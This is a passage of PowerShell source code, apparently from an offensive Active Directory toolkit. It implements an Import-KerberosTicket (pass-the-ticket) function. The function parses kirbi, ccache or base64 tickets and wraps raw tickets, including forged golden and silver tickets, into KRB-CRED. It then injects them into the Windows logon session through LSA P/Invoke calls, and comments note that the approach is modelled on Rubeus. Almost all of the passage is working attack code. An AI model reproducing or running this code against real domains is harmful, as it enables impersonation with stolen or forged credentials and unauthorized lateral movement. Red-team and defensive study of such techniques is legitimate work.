            if ($kirbiData.ClientName -or $kirbiData.ClientRealm) {
                $Script:KirbiMetadata = @{
                    UserName = $kirbiData.ClientName
                    Realm = $kirbiData.ClientRealm
                    EncryptionType = $kirbiData.EncryptionType
                    AuthTime = $kirbiData.AuthTime
                    StartTime = $kirbiData.StartTime
                    EndTime = $kirbiData.EndTime
                    RenewTill = $kirbiData.RenewTill
                }
                Write-Log "[Import-KerberosTicket] Parsed kirbi: $($kirbiData.ClientName) @ $($kirbiData.ClientRealm) (etype $($kirbiData.EncryptionType))"
                if ($kirbiData.EndTime) {
                    Write-Log "[Import-KerberosTicket] Ticket endtime: $($kirbiData.EndTime)"
                }
            }
        }
        elseif ($TicketBase64) {
            $TicketBytes = [Convert]::FromBase64String($TicketBase64)
            Write-Log "[Import-KerberosTicket] Decoded Base64 ticket"
        }
        elseif (-not $TicketBytes) {
            throw "You must provide ticket data via -TicketBytes, -TicketBase64, -Kirbi, or -Ccache"
        }

        Write-Log "[Import-KerberosTicket] Ticket size: $($TicketBytes.Length) bytes"

        # Check ticket format by first byte:
        # - 0x76 = APPLICATION 22 = KRB-CRED (already wrapped, ready for import)
        # - 0x66 = APPLICATION 6 = Kerberos Ticket (from New-GoldenTicket, New-SilverTicket)
        # - 0x30 = SEQUENCE = Raw ticket content (from AS-REP parsing, ticket without APPLICATION tag)
        # - 0x61 = APPLICATION 1 = Legacy/alternate ticket format
        $firstByte = if ($TicketBytes.Length -gt 0) { $TicketBytes[0] } else { 0 }
        $isKrbCred = ($firstByte -eq 0x76)
        $isRawTicket = ($firstByte -eq 0x66 -or $firstByte -eq 0x30 -or $firstByte -eq 0x61)

        if ($isKrbCred) {
            Write-Log "[Import-KerberosTicket] Input is already in KRB-CRED format"
            $krbCredBytes = $TicketBytes
        }
        elseif ($isRawTicket) {
            $formatName = switch ($firstByte) {
                0x66 { "APPLICATION 6 (Kerberos Ticket)" }
                0x30 { "SEQUENCE (raw ticket content)" }
                0x61 { "APPLICATION 1 (alternate format)" }
            }
            Write-Log "[Import-KerberosTicket] Input is raw Ticket ($formatName) - building KRB-CRED wrapper"

            if (-not $SessionKey -or $SessionKey.Length -eq 0) {
                throw "SessionKey is required when importing raw ticket bytes. Please provide the session key from the TGT/TGS response."
            }

            # Build parameters for KRB-CRED
            $krbCredParams = @{
                Ticket = $TicketBytes
                SessionKey = $SessionKey
                SessionKeyType = $SessionKeyType
                Realm = $Realm
                ClientName = $ClientName
                ServerName = $ServerName
                ServerInstance = $ServerInstance
            }
            # Add optional time parameters if provided (critical for Windows LSA to accept ticket)
            if ($AuthTime) { $krbCredParams['AuthTime'] = $AuthTime }
            if ($StartTime) { $krbCredParams['StartTime'] = $StartTime }
            if ($EndTime) { $krbCredParams['EndTime'] = $EndTime }
            if ($RenewTill) { $krbCredParams['RenewTill'] = $RenewTill }
            if ($TicketFlags) { $krbCredParams['TicketFlags'] = $TicketFlags }

            $krbCredBytes = Build-KRBCred @krbCredParams

            Write-Log "[Import-KerberosTicket] KRB-CRED built: $($krbCredBytes.Length) bytes"
        }
        else {
            Write-Log "[Import-KerberosTicket] Unknown ticket format (first byte: 0x$($TicketBytes[0].ToString('X2'))), assuming KRB-CRED"
            $krbCredBytes = $TicketBytes
        }

        # Update TicketBytes to use KRB-CRED
        $TicketBytes = $krbCredBytes

        #endregion

        #region P/Invoke definitions

        $LSACode = @"
using System;
using System.Runtime.InteropServices;

public class LSATicketImport
{
    // Constants
    public const int KERB_SUBMIT_TKT_MESSAGE_TYPE = 21;
    public const int STATUS_SUCCESS = 0;

    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    // KERB_CRYPTO_KEY32 - uses Offset instead of Pointer (like Rubeus)
    // This is critical: Windows expects offsets relative to buffer start,
    // not pointers which become invalid when buffer is copied to kernel space
    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY32
    {
        public int KeyType;
        public int Length;
        public int Offset;  // Offset relative to start of KERB_SUBMIT_TKT_REQUEST
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_SUBMIT_TKT_REQUEST
    {
        public int MessageType;
        public LUID LogonId;
        public int Flags;
        public KERB_CRYPTO_KEY32 Key;  // Using KERB_CRYPTO_KEY32 with offset
        public int KerbCredSize;
        public int KerbCredOffset;
    }

    // P/Invoke declarations
    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaLookupAuthenticationPackage(
        IntPtr LsaHandle,
        ref LSA_STRING PackageName,
        out uint AuthenticationPackage
    );

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(
        IntPtr LsaHandle,
        uint AuthenticationPackage,
        IntPtr ProtocolSubmitBuffer,
        int SubmitBufferLength,
        out IntPtr ProtocolReturnBuffer,
        out int ReturnBufferLength,
        out int ProtocolStatus
    );

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaNtStatusToWinError(int Status);

    // Helper to create LSA_STRING
    public static LSA_STRING CreateLsaString(string s)
    {
        LSA_STRING lsa = new LSA_STRING();
        lsa.Length = (ushort)s.Length;
        lsa.MaximumLength = (ushort)(s.Length + 1);
        lsa.Buffer = Marshal.StringToHGlobalAnsi(s);
        return lsa;
    }
}
"@

        # Check if type is already loaded first
        if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
            try {
                Add-Type -TypeDefinition $LSACode -ErrorAction Stop
                Write-Log "[Import-KerberosTicket] LSATicketImport type compiled successfully"
            } catch {
                # Check if it's just already loaded
                if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
                    throw "Failed to compile LSA P/Invoke code: $_"
                }
            }
        } else {
            Write-Log "[Import-KerberosTicket] LSATicketImport type already loaded"
        }

        #endregion
    }

    process {
        # Initialize handle before try block to ensure finally can check it
        $lsaHandle = [IntPtr]::Zero

        try {
            # Verify type is available
            if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
                throw "LSATicketImport type not available. This may require administrator privileges."
            }

            #region Connect to LSA

            Write-Log "[Import-KerberosTicket] Connecting to LSA..."
            $status = [LSATicketImport]::LsaConnectUntrusted([ref]$lsaHandle)

            if ($status -ne 0) {
                $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
                throw "LsaConnectUntrusted failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
            }

            Write-Log "[Import-KerberosTicket] LSA handle: $lsaHandle"

            #endregion

            #region Lookup Kerberos package

            $packageName = [LSATicketImport]::CreateLsaString("Kerberos")
            $authPackage = [uint32]0

            try {
                $status = [LSATicketImport]::LsaLookupAuthenticationPackage(
                    $lsaHandle,
                    [ref]$packageName,
                    [ref]$authPackage
                )

                if ($status -ne 0) {
                    $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
                    throw "LsaLookupAuthenticationPackage failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
                }
            }
            finally {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($packageName.Buffer)
            }

            Write-Log "[Import-KerberosTicket] Kerberos auth package ID: $authPackage"

            #endregion

            #region Build KERB_SUBMIT_TKT_REQUEST

            # Calculate buffer size
            # Structure: KERB_SUBMIT_TKT_REQUEST (fixed size) + KRB-CRED ticket
            # Note: Session key is embedded in KRB-CRED, not passed separately
            $structSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][LSATicketImport+KERB_SUBMIT_TKT_REQUEST])
            $totalSize = $structSize + $TicketBytes.Length

            Write-Log "[Import-KerberosTicket] Buffer size: $totalSize (struct: $structSize, ticket: $($TicketBytes.Length))"

            # Allocate buffer
            $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($totalSize)

            try {
                # Zero the buffer
                $zeros = New-Object byte[] $totalSize
                [System.Runtime.InteropServices.Marshal]::Copy($zeros, 0, $buffer, $totalSize)

                # Build the request structure
                # Note: Like Rubeus, we don't pass the session key separately - it's already
                # embedded in the KRB-CRED structure (in EncKrbCredPart). Passing a Key pointer
                # can cause issues because the buffer is copied to kernel space where the
                # pointer becomes invalid.
                $request = New-Object LSATicketImport+KERB_SUBMIT_TKT_REQUEST
                $request.MessageType = [LSATicketImport]::KERB_SUBMIT_TKT_MESSAGE_TYPE

                # LUID (0 = current session)
                $request.LogonId.LowPart = [uint32]($LUID -band 0xFFFFFFFF)
                $request.LogonId.HighPart = [int]($LUID -shr 32)

                $request.Flags = 0

                # Don't pass session key separately - it's in KRB-CRED
                # Using KERB_CRYPTO_KEY32 with Offset (not pointer) like Rubeus
                $request.Key.KeyType = 0
                $request.Key.Length = 0
                $request.Key.Offset = 0  # Not used when key is embedded in KRB-CRED

                # Ticket offset is right after the structure (no session key in between)
                $request.KerbCredSize = $TicketBytes.Length
                $request.KerbCredOffset = $structSize

                # Marshal structure to buffer
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($request, $buffer, $false)

                # Copy ticket data to buffer (right after the structure)
                $ticketPtr = [IntPtr]::Add($buffer, $structSize)
                [System.Runtime.InteropServices.Marshal]::Copy($TicketBytes, 0, $ticketPtr, $TicketBytes.Length)

                #endregion

                #region Call LSA

                Write-Log "[Import-KerberosTicket] Submitting ticket to LSA..."

                $returnBuffer = [IntPtr]::Zero
                $returnLength = 0
                $protocolStatus = 0

                $status = [LSATicketImport]::LsaCallAuthenticationPackage(
                    $lsaHandle,
                    $authPackage,
                    $buffer,
                    $totalSize,
                    [ref]$returnBuffer,
                    [ref]$returnLength,
                    [ref]$protocolStatus
                )

                if ($returnBuffer -ne [IntPtr]::Zero) {
                    $null = [LSATicketImport]::LsaFreeReturnBuffer($returnBuffer)
                }

                if ($status -ne 0) {
                    $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
                    throw "LsaCallAuthenticationPackage failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
                }

                if ($protocolStatus -ne 0) {
                    $winError = [LSATicketImport]::LsaNtStatusToWinError($protocolStatus)
                    # Check for common permission-related errors
                    if ($protocolStatus -eq 0xC000009A -or $winError -eq 1450) {
                        # This error commonly occurs when:
                        # 1. The workstation is not joined to the target domain
                        # 2. Remote Credential Guard is enabled
                        # 3. Running in a restricted session
                        throw "Ticket import failed (NTSTATUS 0x$($protocolStatus.ToString('X8'))): This typically occurs on non-domain-joined machines or with Remote Credential Guard enabled. SimpleBind fallback will be used."
                    }
                    throw "Kerberos package returned error NTSTATUS 0x$($protocolStatus.ToString('X8')) (Win32: $winError)"
                }

                #endregion

                Write-Log "[Import-KerberosTicket] Ticket successfully imported ($($TicketBytes.Length) bytes)"

                # Build return object with metadata (if available from ccache parsing)
                $returnObj = [PSCustomObject]@{
                    Success = $true
                    TicketSize = $TicketBytes.Length
                    LUID = $LUID
                    Message = "Ticket imported successfully"
                    UserName = $null
                    Realm = $null
                    EncryptionType = $null
                    AuthTime = $null
                    StartTime = $null
                    EndTime = $null
                    RenewTill = $null
                }

                # Add ccache metadata if available (includes ticket times)
                if ($Script:CcacheMetadata) {
                    $returnObj.UserName = $Script:CcacheMetadata.UserName
                    $returnObj.Realm = $Script:CcacheMetadata.Realm
                    $returnObj.EncryptionType = $Script:CcacheMetadata.EncryptionType
                    $returnObj.AuthTime = $Script:CcacheMetadata.AuthTime
                    $returnObj.StartTime = $Script:CcacheMetadata.StartTime
                    $returnObj.EndTime = $Script:CcacheMetadata.EndTime
                    $returnObj.RenewTill = $Script:CcacheMetadata.RenewTill
                }
                # Add kirbi metadata if available (from parsed kirbi file)
                elseif ($Script:KirbiMetadata) {
                    $returnObj.UserName = $Script:KirbiMetadata.UserName
                    $returnObj.Realm = $Script:KirbiMetadata.Realm
                    $returnObj.EncryptionType = $Script:KirbiMetadata.EncryptionType
                    $returnObj.AuthTime = $Script:KirbiMetadata.AuthTime
                    $returnObj.StartTime = $Script:KirbiMetadata.StartTime
                    $returnObj.EndTime = $Script:KirbiMetadata.EndTime
                    $returnObj.RenewTill = $Script:KirbiMetadata.RenewTill
                }
                # Fallback to provided parameters
                elseif ($ClientName -or $Realm) {
                    $returnObj.UserName = $ClientName
                    $returnObj.Realm = $Realm
                    $returnObj.EncryptionType = $SessionKeyType
                }

                # Check if ticket is expired and warn user
                if ($returnObj.EndTime) {
                    $now = [DateTime]::UtcNow
                    if ($returnObj.EndTime -lt $now) {
                        $expiredAgo = $now - $returnObj.EndTime
                        Write-Warning "[Import-KerberosTicket] Ticket is EXPIRED (ended $($expiredAgo.TotalHours.ToString('F1')) hours ago at $($returnObj.EndTime.ToString('u')))"
                        $returnObj.Message = "Ticket imported but is EXPIRED since $($returnObj.EndTime.ToString('u'))"
                    }
                    elseif (($returnObj.EndTime - $now).TotalMinutes -lt 5) {
                        Write-Warning "[Import-KerberosTicket] Ticket expires in less than 5 minutes (at $($returnObj.EndTime.ToString('u')))"
                    }
                }

                return $returnObj

            } finally {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
            }

        } catch {
            Write-Log "[Import-KerberosTicket] Failed to import ticket: $_"

            return [PSCustomObject]@{
                Success = $false
                Error = $_.Exception.Message
                Message = "Failed to import ticket: $_"
            }

        } finally {
            if ($lsaHandle -ne [IntPtr]::Zero) {
                $null = [LSATicketImport]::LsaDeregisterLogonProcess($lsaHandle)
            }
        }
    }

    end {
        Write-Log "[Import-KerberosTicket] Ticket import completed"
    }
}
